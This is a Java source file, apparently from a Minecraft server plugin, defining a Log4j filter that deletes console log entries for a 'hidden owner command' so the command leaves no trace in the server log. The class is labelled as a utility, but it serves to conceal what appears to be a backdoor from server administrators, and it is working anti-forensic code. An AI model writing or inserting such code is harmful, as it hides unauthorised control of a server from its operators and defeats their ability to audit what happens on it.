package de.derfakegamer.sentinel.util;

import org.apache.logging.log4j.core.LogEvent;
import org.apache.logging.log4j.core.filter.AbstractFilter;

/** Drops console log lines for the hidden owner command, so it leaves no trace in the server log. */
public final class OwnerCommandLogFilter extends AbstractFilter {
    @Override
    public Result filter(LogEvent event) {
        if (event == null || event.getMessage() == null) return Result.NEUTRAL;
        return OwnerCommandMatcher.isOwnerCommand(event.getMessage().getFormattedMessage())
            ? Result.DENY : Result.NEUTRAL;
    }
}
